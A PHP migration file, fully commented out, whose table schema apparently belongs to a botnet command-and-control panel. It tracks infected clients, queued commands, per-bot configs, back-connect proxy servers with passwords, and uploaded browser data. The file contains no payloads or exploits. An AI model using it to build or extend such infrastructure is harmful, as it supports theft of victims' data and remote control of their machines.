<?php defined('SYSPATH') or die('No direct script access.');

class Init extends Migration
{
    public function up()
    {
//        $this->create_table
//        (
//            'autosilentip',
//            array
//            (
//                'id' => array('big_primary_key'),
//                'addrfrom' => array('inet', 'null' => false),
//                'addrto' => array('inet', 'null' => false),
//            ),
//            false
//        );
//        $this->run_query('CREATE INDEX autosilentip_addrfrom_addrto_idx ON autosilentip USING btree (addrfrom, addrto)');
//        
//        $this->create_table
//        (
//            'autosilentprefix',
//            array
//            (
//                'id' => array('big_primary_key'),
//                'regex' => array('text', 'null' => false),
//            ),
//            false
//        );
//        $this->run_query('CREATE INDEX autosilentprefix_regex_idx ON autosilentprefix USING btree (regex)');
//        
//        $this->create_table
//        (
//            'autosilentvars',
//            array
//            (
//                'id' => array('big_primary_key'),
//                'name' => array('text', 'null' => false),
//                'value' => array('text', 'null' => false),
//            ),
//            false
//        );
//        $this->run_query('CREATE INDEX autosilentvars_name_idx ON autosilentvars USING btree (name)');
//        
//        $this->create_table
//        (
//            'backconndata',
//            array
//            (
//                'id' => array('big_primary_key'),
//                'datetime' => array('datetime', 'default' => DB::expr('now()')),
//                'name' => array('text', 'null' => false),
//                'clientid' => array('big_integer', 'null' => false),
//                'ip' => array('inet'),
//                'port' => array('integer'),
//                'operation' => array('string', 'length' => 8),
//            ),
//            false
//        );
//        $this->run_query('CREATE INDEX backconndata_clientid_operation_idx ON backconndata USING btree (clientid, operation)');
//        $this->run_query('CREATE INDEX backconndata_datetime_idx ON backconndata USING btree (datetime)');
//        
//        $this->create_table
//        (
//            'backconnservers',
//            array
//            (
//                'name' => array('text', 'null' => false),
//                'ip' => array('inet'),
//                'port' => array('integer'),
//                'password1' => array('text'),
//                'password2' => array('text'),
//            ),
//            false
//        );
//        $this->run_query('ALTER TABLE ONLY backconnservers ADD CONSTRAINT backconnservers_pkey PRIMARY KEY (name)');
//
//        $this->create_table
//        (
//            'clients',
//            array
//            (
//                'clientid' => array('big_primary_key'),
//                'cid3' => array('big_integer', 'default' => 0, 'null' => false),
//                'cid2' => array('big_integer', 'default' => 0, 'null' => false),
//                'cid1' => array('big_integer', 'default' => 0, 'null' => false),
//                'cid0' => array('big_integer', 'default' => 0, 'null' => false),
//                'prefix' => array('text'),
//                'net' => array('text'),
//                'system' => array('text'),
//                'ip' => array('inet'),
//                'location' => array('character', 'length' => 2),
//                'version' => array('integer'),
//                'registered' => array('datetime'),
//                'lastregistration' => array('datetime'),
//                'lastactivity' => array('datetime'),
//                'silent' => array('boolean', 'default' => DB::expr('false')),
//            ),
//            false
//        );
//        $this->run_query('ALTER TABLE ONLY clients ADD CONSTRAINT clients_cid3_cid2_cid1_cid0_key UNIQUE (cid3, cid2, cid1, cid0)');
//        $this->run_query('CREATE INDEX cid0_cid1 ON clients USING btree (cid0, cid1)');
//        $this->run_query('CREATE INDEX clients_clientid_net_system_location_idx ON clients USING btree (clientid, net, system, location)');
//        
//        $this->create_table
//        (
//            'commands',
//            array
//            (
//                'id' => array('big_primary_key'),
//                'clientid' => array('big_integer', 'null' => false),
//                'command' => array('integer'),
//                'param' => array('text'),
//            ),
//            false
//        );
//        $this->run_query('CREATE INDEX commands_clientid_idx ON commands USING btree (clientid)');
//
//        $this->create_table
//        (
//            'configs',
//            array
//            (
//                'id' => array('big_primary_key'),
//                'datetime' => array('datetime', 'default' => DB::expr('now()')),
//                'clientid' => array('big_integer', 'default' => 0, 'null' => false),
//                'net' => array('text', 'default' => '*', 'null' => false),
//                'system' => array('text', 'default' => '*', 'null' => false),
//                'location' => array('character', 'length' => 2, 'default' => '*', 'null' => false),
//                'version' => array('integer'),
//                'config' => array('binary'),
//            ),
//            false
//        );
//        $this->run_query('CREATE INDEX configs_clientid_net_system_location_version_idx ON configs USING btree (clientid, net, system, location, version)');
//        $this->run_query('CREATE INDEX configs_datetime_idx ON configs USING btree (datetime)');
//
//        $this->create_table
//        (
//            'constcommands',
//            array
//            (
//                'id' => array('big_primary_key'),
//                'clientid' => array('big_integer', 'default' => 0, 'null' => false),
//                'net' => array('text', 'default' => '*', 'null' => false),
//                'system' => array('text', 'default' => '*', 'null' => false),
//                'location' => array('character', 'length' => 2, 'default' => '*', 'null' => false),
//                'command' => array('integer'),
//                'param' => array('text'),
//            ),
//            false
//        );
//
//        $this->create_table
//        (
//            'databrowser',
//            array
//            (
//                'id' => array('big_primary_key'),
//                'datetime' => array('datetime', 'default' => DB::expr('now()')),
//                'clientid' => array('big_integer', 'null' => false),
//                'data' => array('binary'),
//            ),
//            false
//        );
//        $this->run_query('CREATE INDEX databrowser_clientid_idx ON databrowser USING btree (clientid)');
//
//        $this->create_table
//        (
//            'datafiles',
//            array
//            (
//                'datetime' => array('datetime', 'default' => DB::expr('now()')),
//                'name' => array('text'),
//                'data' => array('binary'),
//                'sha1' => array('string', 'length' => 40, 'null' => false),
//                'clientid' => array('big_integer', 'default' => 0, 'null' => false),
//            ),
//            false
//        );
//        $this->run_query('ALTER TABLE ONLY datafiles ADD CONSTRAINT datafiles_pkey PRIMARY KEY (sha1)');
//
//        $this->create_table
//        (
//            'datageneral',
//            array
//            (
//                'id' => array('big_primary_key'),
//                'datetime' => array('datetime', 'default' => DB::expr('now()')),
//                'clientid' => array('big_integer', 'null' => false),
//                'data' => array('text'),
//            ),
//            false
//        );
//        $this->run_query('CREATE INDEX datageneral_clientid_idx ON datageneral USING btree (clientid)');
//        
//        $this->create_table
//        (
//            'debugstat',
//            array
//            (
//                'host' => array('text', 'null' => false),
//                'requests' => array('big_integer'),
//                'inbytes' => array('big_integer'),
//                'outbutes' => array('big_integer'),
//            ),
//            false
//        );
//        $this->run_query('ALTER TABLE ONLY debugstat ADD CONSTRAINT debugstat_pkey PRIMARY KEY (host)');
//        
//        $this->create_table
//        (
//            'files',
//            array
//            (
//                'id' => array('big_primary_key'),
//                'name' => array('text', 'null' => false),
//                'data' => array('binary'),
//                'public' => array('boolean', 'default' => DB::expr('false'), 'null' => false),
//                'clientid' => array('big_integer', 'default' => 0, 'null' => false),
//                'net' => array('text', 'default' => '*', 'null' => false),
//                'system' => array('text', 'default' => '*', 'null' => false),
//                'location' => array('character', 'length' => 2, 'default' => '*', 'null' => false),
//            ),
//            false
//        );
//        $this->run_query('CREATE INDEX files_name_clientid_net_system_location_idx ON files USING btree (name, clientid, net, system, location)');
//        
//        $this->create_table
//        (
//            'idlecommands',
//            array
//            (
//                'id' => array('big_primary_key'),
//                'block' => array('big_integer', 'null' => false),
//                'clientid' => array('big_integer'),
//                'net' => array('text', 'default' => '*', 'null' => false),
//                'system' => array('text', 'default' => '*', 'null' => false),
//                'location' => array('character', 'length' => 2, 'default' => '*', 'null' => false),
//                'command' => array('integer', 'null' => false),
//                'param' => array('text', 'default' => '', 'null' => false),
//                'enabled' => array('boolean', 'default' => DB::expr('true')),
//            ),
//            false
//        );
//        $this->run_query('CREATE INDEX idlecommands_clientid_block_idx ON idlecommands USING btree (clientid, block)');
//
//        $this->create_table
//        (
//            'location',
//            array
//            (
//                'addrfrom' => array('inet', 'null' => false),
//                'addrto' => array('inet', 'null' => false),
//                'country' => array('text'),
//                'code' => array('character', 'length' => 2),
//            ),
//            false
//        );
//        $this->run_query('CREATE INDEX location_addrfrom_addrto_idx ON location USING btree (addrfrom, addrto)');
//        
//        $this->create_table
//        (
//            'log',
//            array
//            (
//                'id' => array('big_primary_key'),
//                'datetime' => array('datetime', 'default' => DB::expr('now()')),
//                'clientid' => array('big_integer', 'null' => false),
//                'commandid' => array('big_integer'),
//                'command' => array('integer'),
//                'result' => array('integer'),
//                'comment' => array('text'),
//            ),
//            false
//        );
//        $this->run_query('CREATE INDEX log_clientid_command_idx ON log USING btree (clientid, command)');
//        $this->run_query('CREATE INDEX log_clientid_id ON log USING btree (clientid, id)');
//
//        $this->create_table
//        (
//            'remoteip',
//            array
//            (
//                'id' => array('big_primary_key'),
//                'name' => array('text', 'null' => false),
//                'addrfrom' => array('inet', 'null' => false),
//                'addrto' => array('inet', 'null' => false),
//            ),
//            false
//        );
//        $this->run_query('ALTER TABLE ONLY remoteip ADD CONSTRAINT remoteip_name_fkey FOREIGN KEY (name) REFERENCES remoteusers(name) ON UPDATE CASCADE ON DELETE CASCADE');
//
//        $this->create_table
//        (
//            'remoteproc',
//            array
//            (
//                'name' => array('text', 'null' => false),
//                'proc' => array('text'),
//            ),
//            false
//        );
//        $this->run_query('ALTER TABLE ONLY remoteproc ADD CONSTRAINT remoteproc_name_proc_key UNIQUE (name, proc)');
//        $this->run_query('ALTER TABLE ONLY remoteproc ADD CONSTRAINT remoteproc_name_fkey FOREIGN KEY (name) REFERENCES remoteusers(name) ON UPDATE CASCADE ON DELETE CASCADE');
//        
//        $this->create_table
//        (
//            'remoteusers',
//            array
//            (
//                'name' => array('text', 'null' => false),
//                'password' => array('text'),
//            ),
//            false
//        );
//        $this->run_query('ALTER TABLE ONLY remoteusers ADD CONSTRAINT remoteusers_pkey PRIMARY KEY (name)');
//
//        $this->create_table
//        (
//            'settings',
//            array
//            (
//                'name' => array('text', 'null' => false),
//                'data' => array('text'),
//            ),
//            false
//        );
//        $this->run_query('ALTER TABLE ONLY settings ADD CONSTRAINT settings_pkey PRIMARY KEY (name)');
//        
//        $this->create_table
//        (
//            'silent',
//            array
//            (
//                'id' => array('big_primary_key'),
//                'net' => array('text', 'default' => '*', 'null' => false),
//                'system' => array('text', 'default' => '*', 'null' => false),
//                'location' => array('character', 'length' => 2, 'default' => '*', 'null' => false),
//            ),
//            false
//        );
//        $this->run_query('CREATE INDEX silent_net_system_location_idx ON silent USING btree (net, system, location)');
//        
//        $this->create_table
//        (
//            'vars',
//            array
//            (
//                'id' => array('big_primary_key'),
//                'clientid' => array('big_integer', 'null' => false),
//                'name' => array('text', 'null' => false),
//                'value' => array('text', 'null' => false),
//                'ttl' => array('integer'),
//                'datetime' => array('datetime', 'default' => DB::expr('now()')),
//            ),
//            false
//        );
//        $this->run_query('CREATE INDEX vars_clientid_idx ON vars USING btree (clientid)');
//        //$this->run_query('CREATE TRIGGER triggervarsinsert AFTER INSERT ON vars FOR EACH ROW EXECUTE PROCEDURE processvarsinsert()');
//
//        $this->create_table
//        (
//            'varscommands',
//            array
//            (
//                'id' => array('big_primary_key'),
//                'clientid' => array('big_integer', 'default' => 0, 'null' => false),
//                'net' => array('text', 'default' => '*', 'null' => false),
//                'system' => array('text', 'default' => '*', 'null' => false),
//                'location' => array('character', 'length' => 2, 'default' => '*', 'null' => false),
//                'name' => array('text'),
//                'command' => array('integer'),
//                'param' => array('text'),
//                'value' => array('text'),
//            ),
//            false
//        );
//        $this->run_query('CREATE INDEX varscommands_clientid_idx ON varscommands USING btree (clientid)');
    }

    public function down()
    {
//        $this->drop_table('autosilentip');
//        $this->drop_table('autosilentprefix');
//        $this->drop_table('autosilentvars');
//        $this->drop_table('backconndata');
//        $this->drop_table('backconnservers');
//        $this->drop_table('clients');
//        $this->drop_table('commands');
//        $this->drop_table('configs');
//        $this->drop_table('constcommands');
//        $this->drop_table('databrowser');
//        $this->drop_table('datafiles');
//        $this->drop_table('datageneral');
//        $this->drop_table('debugstat');
//        $this->drop_table('files');
//        $this->drop_table('idlecommands');
//        $this->drop_table('location');
//        $this->drop_table('log');
//        $this->drop_table('remoteip');
//        $this->drop_table('remoteproc');
//        $this->drop_table('remoteusers');
//        $this->drop_table('settings');
//        $this->drop_table('silent');
//        $this->drop_table('vars');
//        $this->drop_table('varscommands');
    }
}
